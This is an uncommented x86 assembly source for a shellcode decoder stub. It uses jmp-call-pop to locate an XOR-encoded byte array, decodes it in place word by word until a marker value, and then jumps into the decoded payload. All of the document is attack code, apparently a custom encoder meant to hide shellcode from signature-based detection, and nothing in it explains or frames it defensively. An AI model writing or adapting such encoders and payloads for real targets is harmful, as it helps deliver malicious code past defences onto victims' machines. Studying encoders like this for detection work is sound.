global _start

section .text

_start:
	
	jmp get_shellcode

decoder:

	pop esi
	push esi
	mov edi,esi

loop:
	mov eax,[esi]
	xor eax,[esi+4]
	cmp eax, 0x90509050
	jz done
	mov [esi],eax
	add esi,0x4
	jmp loop

done:
 	jmp shellcode	

get_shellcode:
	
	call decoder
	shellcode: db 0x43,0xdf,0xba,0x49,0x72,0x1f,0xea,0x21,0x10,0x7e,0x99,0x49,0x78,0x1c,0xf0,0x27,0x57,0x74,0xdf,0x08,0x78,0x5b,0x56,0xeb,0x28,0xd2,0xb4,0xb8,0xa1,0x33,0x04,0xb3,0x6c,0xb3,0x94,0x23,0xfc,0x23,0x04,0xb3
	
	
